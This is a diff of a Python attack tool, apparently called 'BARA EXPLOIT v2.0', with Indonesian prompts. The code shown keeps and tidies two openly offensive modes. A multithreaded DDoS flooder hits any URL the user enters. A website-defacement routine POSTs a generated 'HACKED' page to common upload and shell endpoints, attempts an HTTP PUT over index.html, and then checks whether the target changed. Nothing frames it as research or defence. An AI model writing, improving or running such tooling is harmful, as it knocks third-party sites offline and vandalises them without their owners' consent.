@@ -10,7 +10,6 @@ from colorama import Fore, init
 init(autoreset=True)
 urllib3.disable_warnings()
 
-# ============ UTILS ============
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -31,7 +30,6 @@ def banner():
                           ╚══════════════════════════════════════╝
 {Fore.RESET}""")
 
-# ============ MENU ============
 def menu():
     print(f"{Fore.YELLOW}[1]{Fore.WHITE} DDoS Attack")
     print(f"{Fore.YELLOW}[2]{Fore.WHITE} Hack / Deface Website")
@@ -52,7 +50,7 @@ def menu():
         banner()
         menu()
 
-# ============ DDOS MODE ============
+# ============ DDOS ============
 stats = {"sent": 0, "success": 0, "fail": 0}
 running = True
 
@@ -80,7 +78,7 @@ def stat_loop(url):
     while running:
         time.sleep(1)
         elapsed = int(time.time() - start)
-        print(f"\r{Fore.GREEN}[+] Target: {Fore.WHITE}{url} {Fore.GREEN}| Sent: {Fore.YELLOW}{stats['sent']} {Fore.GREEN}| OK: {Fore.CYAN}{stats['success']} {Fore.GREEN}| Fail: {Fore.RED}{stats['fail']} {Fore.GREEN}| Time: {Fore.WHITE}{elapsed}s   ", end="")
+        print(f"\r{Fore.GREEN}[+] {url} {Fore.GREEN}| Sent: {Fore.YELLOW}{stats['sent']} {Fore.GREEN}| OK: {Fore.CYAN}{stats['success']} {Fore.GREEN}| Fail: {Fore.RED}{stats['fail']} {Fore.GREEN}| Time: {Fore.WHITE}{elapsed}s   ", end="")
 
 def ddos_menu():
     clear()
@@ -89,15 +87,15 @@ def ddos_menu():
     ║          DDoS ATTACK MODE            ║
     ╚══════════════════════════════════════╝
     {Fore.RESET}""")
-    url = input(f"{Fore.CYAN}Masukkan URL target (wajib https://): {Fore.WHITE}").strip()
-    if not url.startswith("http://") and not url.startswith("https://"):
+    url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
+    if not url.startswith("http"):
         print(f"{Fore.RED}[!] URL harus pakai http:// atau https://{Fore.RESET}")
         time.sleep(2)
         ddos_menu()
         return
 
     try:
-        workers = int(input(f"{Fore.CYAN}Jumlah worker (default 200): {Fore.WHITE}") or "200")
+        workers = int(input(f"{Fore.CYAN}Worker (default 200): {Fore.WHITE}") or "200")
     except:
         workers = 200
 
@@ -110,7 +108,7 @@ def ddos_menu():
     running = True
     stats = {"sent": 0, "success": 0, "fail": 0}
 
-    print(f"\n{Fore.YELLOW}[*] Memulai serangan ke {url}...{Fore.RESET}\n")
+    print(f"\n{Fore.YELLOW}[*] Attack ke {url}...{Fore.RESET}\n")
 
     for _ in range(workers):
         threading.Thread(target=worker, args=(url,), daemon=True).start()
@@ -120,12 +118,12 @@ def ddos_menu():
     time.sleep(duration)
     running = False
     time.sleep(1)
-    print(f"\n\n{Fore.GREEN}[✓] Selesai! Terkirim: {stats['sent']} | OK: {stats['success']} | Fail: {stats['fail']}{Fore.RESET}")
+    print(f"\n\n{Fore.GREEN}[✓] Selesai! Sent: {stats['sent']} | OK: {stats['success']} | Fail: {stats['fail']}{Fore.RESET}")
     input(f"\n{Fore.CYAN}ENTER balik ke menu...{Fore.RESET}")
     banner()
     menu()
 
-# ============ HACK / DEFACE MODE ============
+# ============ HACK / DEFACE ============
 def build_deface(pesan):
     return f"""<!DOCTYPE html>
 <html>
@@ -135,30 +133,19 @@ def build_deface(pesan):
 <style>
   * {{ margin:0; padding:0; box-sizing:border-box; }}
   body {{
-    background:#000;
-    color:#0f0;
+    background:#000; color:#0f0;
     font-family:'Courier New',monospace;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
+    min-height:100vh; display:flex;
+    justify-content:center; align-items:center;
     overflow:hidden;
   }}
-  #matrix {{
-    position:fixed; top:0; left:0;
-    width:100%; height:100%; z-index:0;
-  }}
-  .content {{
-    position:relative; z-index:2;
-    text-align:center; padding:40px;
-  }}
+  #matrix {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; }}
+  .content {{ position:relative; z-index:2; text-align:center; padding:40px; }}
   h1 {{
-    font-size:80px;
-    color:#ff0000;
+    font-size:80px; color:#ff0000;
     text-shadow:0 0 20px #ff0000, 0 0 60px #ff0000;
     animation:glitch 0.3s infinite;
-    letter-spacing:8px;
-    font-weight:900;
+    letter-spacing:8px; font-weight:900;
   }}
   @keyframes glitch {{
     0% {{ transform:translate(0); }}
@@ -169,32 +156,22 @@ def build_deface(pesan):
     100% {{ transform:translate(0); }}
   }}
   .msg {{
-    font-size:28px;
-    color:#0f0;
-    margin-top:30px;
-    letter-spacing:4px;
-    text-shadow:0 0 15px #0f0;
-    font-weight:bold;
+    font-size:28px; color:#0f0;
+    margin-top:30px; letter-spacing:4px;
+    text-shadow:0 0 15px #0f0; font-weight:bold;
   }}
   .skull {{ font-size:150px; margin-bottom:20px; animation:pulse 1s infinite; }}
   @keyframes pulse {{
     0%,100% {{ opacity:1; transform:scale(1); }}
     50% {{ opacity:0.5; transform:scale(1.15); }}
   }}
-  .footer {{
-    margin-top:50px; color:#666;
-    font-size:14px; letter-spacing:3px;
-  }}
+  .footer {{ margin-top:50px; color:#666; font-size:14px; letter-spacing:3px; }}
   .warning {{
     color:#ff0000; font-size:22px;
-    margin-top:25px;
-    animation:blink 0.5s infinite;
+    margin-top:25px; animation:blink 0.5s infinite;
     letter-spacing:4px;
   }}
-  @keyframes blink {{
-    0%,100% {{ opacity:1; }}
-    50% {{ opacity:0; }}
-  }}
+  @keyframes blink {{ 0%,100% {{ opacity:1; }} 50% {{ opacity:0; }} }}
 </style>
 </head>
 <body>
@@ -204,7 +181,7 @@ def build_deface(pesan):
   <h1>HACKED</h1>
   <div class="msg">{pesan}</div>
   <div class="warning">⚠ SYSTEM COMPROMISED ⚠</div>
-  <div class="footer">BARA EXPLOIT v2.0 &mdash; {time.strftime('%Y-%m-%d %H:%M:%S')}</div>
+  <div class="footer">BARA EXPLOIT v2.0 — {time.strftime('%Y-%m-%d %H:%M:%S')}</div>
 </div>
 <script>
 const canvas = document.getElementById('matrix');
@@ -233,26 +210,19 @@ setInterval(draw, 33);
 </html>"""
 
 def try_deface(target_url, payload):
-    """Coba kirim payload deface ke beberapa endpoint umum."""
     endpoints = [
-        "/upload.php", "/upload", "/fileupload", "/admin/upload.php",
-        "/wp-admin/admin-ajax.php", "/xmlrpc.php",
-        "/index.php", "/index.html", "/home.html",
-        "/shell.php", "/cmd.php", "/backdoor.php",
-        "/api/upload", "/uploadfile", "/file/upload"
+        "/upload", "/api/upload", "/upload.php", "/file/upload",
+        "/uploadfile", "/shell.php", "/admin/upload.php",
+        "/upload.html", "/admin/upload", "/api/v1/upload"
     ]
     headers = {
         "User-Agent": "Mozilla/5.0 (BARA-DEFACE)",
         "Content-Type": "application/x-www-form-urlencoded"
     }
     payloads = [
-        {"file": payload},
-        {"content": payload},
-        {"data": payload},
-        {"html": payload},
-        {"page": payload},
+        {"file": payload}, {"content": payload},
+        {"data": payload}, {"html": payload}, {"page": payload},
     ]
-
     results = []
     base = target_url.rstrip("/")
 
@@ -261,16 +231,15 @@ def try_deface(target_url, payload):
             try:
                 r = requests.post(base + ep, data=p, headers=headers, timeout=5, verify=False)
                 if r.status_code in [200, 201, 302]:
-                    results.append((ep, r.status_code, "mungkin berhasil"))
-            except Exception:
+                    results.append((ep, r.status_code))
+            except:
                 pass
     return results
 
-def try_put_deface(target_url, payload):
-    """Coba PUT method (kadang server salah config)."""
+def try_put(target_url, payload):
     try:
-        r = requests.put(target_url + "/index.html", data=payload,
-                         headers={"User-Agent": "BARA"}, timeout=5, verify=False)
+        r = requests.put(target_url.rstrip("/") + "/index.html",
+                         data=payload, headers={"User-Agent": "BARA"}, timeout=5, verify=False)
         return r.status_code
     except:
         return None
@@ -283,57 +252,50 @@ def hack_menu():
     ╚══════════════════════════════════════╝
     {Fore.RESET}""")
     url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
-    if not url.startswith("http://") and not url.startswith("https://"):
+    if not url.startswith("http"):
         print(f"{Fore.RED}[!] URL harus pakai http:// atau https://{Fore.RESET}")
         time.sleep(2)
         hack_menu()
         return
 
-    pesan = input(f"{Fore.CYAN}Text deface (contoh: WEBSITE HACKED BY BARA): {Fore.WHITE}").strip()
+    pesan = input(f"{Fore.CYAN}Text deface: {Fore.WHITE}").strip()
     if not pesan:
         pesan = "WEBSITE HACKED BY BARA"
 
-    # Proses
     print(f"\n{Fore.RED}[*] Scanning target: {url}{Fore.RESET}")
     time.sleep(1)
-
     print(f"{Fore.YELLOW}[*] Enumerating endpoints...{Fore.RESET}")
     time.sleep(1)
 
     payload = build_deface(pesan)
 
-    print(f"{Fore.YELLOW}[*] Injecting deface payload...{Fore.RESET}")
+    print(f"{Fore.YELLOW}[*] Injecting payload...{Fore.RESET}")
     results = try_deface(url, payload)
 
     print(f"{Fore.YELLOW}[*] Trying PUT method...{Fore.RESET}")
-    put_status = try_put_deface(url, payload)
+    put_status = try_put(url, payload)
 
-    # Report
     print(f"\n{Fore.CYAN}══════════ HASIL ══════════{Fore.RESET}")
     if results:
-        for ep, code, note in results:
-            print(f"{Fore.GREEN}[+] {ep} → HTTP {code} ({note}){Fore.RESET}")
+        for ep, code in results:
+            print(f"{Fore.GREEN}[+] {ep} → HTTP {code}{Fore.RESET}")
     else:
-        print(f"{Fore.RED}[-] Tidak ada endpoint upload yang vulnerable.{Fore.RESET}")
-
+        print(f"{Fore.RED}[-] Tidak ada endpoint vulnerable.{Fore.RESET}")
     if put_status:
         print(f"{Fore.YELLOW}[?] PUT /index.html → HTTP {put_status}{Fore.RESET}")
 
-    # Cek apakah web target berubah
-    print(f"\n{Fore.YELLOW}[*] Verifying target...{Fore.RESET}")
+    print(f"\n{Fore.YELLOW}[*] Verifying...{Fore.RESET}")
     time.sleep(2)
     try:
         r = requests.get(url, timeout=5, verify=False)
         if pesan.lower() in r.text.lower() or "HACKED" in r.text:
             print(f"{Fore.GREEN}[✓] TARGET BERHASIL DI-DEFACE!{Fore.RESET}")
-            print(f"{Fore.GREEN}[✓] Buka {url} buat lihat hasilnya.{Fore.RESET}")
         else:
             print(f"{Fore.RED}[✗] Target belum berubah.{Fore.RESET}")
-            print(f"{Fore.YELLOW}[!] Kemungkinan server ga vulnerable ke metode ini.{Fore.RESET}")
+            print(f"{Fore.YELLOW}[!] Server ga vulnerable ke metode ini.{Fore.RESET}")
     except Exception as e:
         print(f"{Fore.RED}[!] Gagal verify: {e}{Fore.RESET}")
 
-    # Efek pecah
     print(f"\n{Fore.RED}")
     for i in range(3):
         print("█" * 60)
@@ -344,7 +306,6 @@ def hack_menu():
     banner()
     menu()
 
-# ============ MAIN ============
 if __name__ == "__main__":
     try:
         banner()
